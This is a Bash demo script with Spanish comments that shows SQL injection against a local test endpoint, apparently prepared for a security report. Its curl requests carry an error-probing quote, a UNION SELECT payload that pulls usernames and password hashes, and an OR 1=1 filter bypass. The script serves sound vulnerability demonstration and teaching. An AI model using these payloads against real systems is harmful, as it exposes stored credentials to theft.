#!/usr/bin/env bash
#
# Demo de SQL Injection (CWE-89 / OWASP A05:2025-Injection) en
# GET /api/v1/productos (src/routes/productos.js, rama vulnerable).
#
# El endpoint pega categoria directo en el SQL:
#   SELECT id, nombre, precio FROM productos WHERE categoria = '${categoria}'
# sin placeholders ni nada, así que una comilla simple en `categoria` se
# escapa del literal y de ahí se puede meter SQL arbitrario.
#
# Solo curl, nada de sqlmap acá (eso va aparte con capturas). Así los
# payloads quedan legibles para el informe.
#
# Uso: ./tests/sqli-demo.sh [BASE_URL]
#   BASE_URL por defecto: http://localhost:8080 (puerto fijo de server.js)

set -euo pipefail

BASE_URL="${1:-http://localhost:8080}"
ENDPOINT="$BASE_URL/api/v1/productos"

separator() {
  echo
  echo "==================================================================="
  echo "$1"
  echo "==================================================================="
}

# --- a) Consulta legítima ------------------------------------------------
# Uso normal, filtra por categoria='electronica'. Esto es la línea base,
# lo que se supone que devuelve el endpoint sin tocar nada raro.
separator "a) Consulta legitima: categoria=electronica"
curl -s -G "$ENDPOINT" --data-urlencode "categoria=electronica"
echo

# --- b) Comilla simple: evidencia de inyectabilidad ----------------------
# categoria = electronica'
# Query queda: SELECT id, nombre, precio FROM productos WHERE categoria = 'electronica''
# La comilla suelta rompe el script sql. Como errorHandler.js no filtra err.message,
# el 500 devuelve el error crudo de SQLite "unrecognized token" — 
# con eso ya se confirma que el input llega sin escapar.
separator "b) Payload de reconocimiento: categoria=electronica' (rompe la query)"
curl -s -i -G "$ENDPOINT" --data-urlencode "categoria=electronica'"
echo

# --- c) UNION-based SQLi: exfiltrar usuarios/password_hash ---------------
# categoria = electronica' UNION SELECT id, username, password_hash FROM usuarios --
# El SELECT original tiene 3 columnas (id, nombre, precio), así que el UNION
# tiene que traer también 3, si no SQLite arroja el mensaje:
# "SELECTs to the left and right of UNION do not have the same number of
# result columns". Por eso id, username, password_hash de `usuarios` (ver
# src/db/database.js). El `-- ` al final come la comilla de cierre que
# agrega el código original. Por esta razón, en el JSON salen los productos de
# electronica más las filas de usuarios, disfrazadas en "nombre" y "precio".
separator "c) UNION-based SQLi: extraer usuarios.username / usuarios.password_hash"
curl -s -G "$ENDPOINT" \
  --data-urlencode "categoria=electronica' UNION SELECT id, username, password_hash FROM usuarios -- "
echo

# --- d) Bypass de filtro con OR 1=1 --------------------------------------
# categoria = x' OR 1=1 --
# Query queda: SELECT id, nombre, precio FROM productos WHERE categoria = 'x' OR 1=1 -- '
# OR 1=1 siempre es verdadero, así que el WHERE ya no filtra nada y devuelve
# TODOS los productos, sin importar qué categoria haya mandado el cliente.
separator "d) Bypass de filtro: categoria=x' OR 1=1 -- (devuelve TODOS los productos)"
curl -s -G "$ENDPOINT" --data-urlencode "categoria=x' OR 1=1 -- "
echo
